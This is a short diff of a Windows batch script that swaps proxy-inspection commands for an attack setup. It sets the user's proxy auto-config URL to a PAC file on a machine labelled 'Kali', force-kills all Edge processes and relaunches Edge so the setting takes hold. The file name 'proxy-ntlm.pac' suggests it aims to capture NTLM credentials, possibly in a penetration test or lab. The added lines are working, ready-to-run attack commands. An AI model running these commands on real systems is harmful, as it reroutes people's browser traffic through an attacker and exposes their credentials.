@@ -1,2 +1,8 @@
-netsh winhttp show proxyreg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL
-netsh winhttp show proxy
+rem set per-user PAC URL to Kali
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL /t REG_SZ /d "http://192.168.1.56/proxy-ntlm.pac" /f
+
+rem make sure Edge is fully closed; this kills all Edge processes for the user (no admin required)
+taskkill /IM msedge.exe /F 2>nul
+
+rem now ask the user to re-open Edge (or do it yourself)
+start msedge
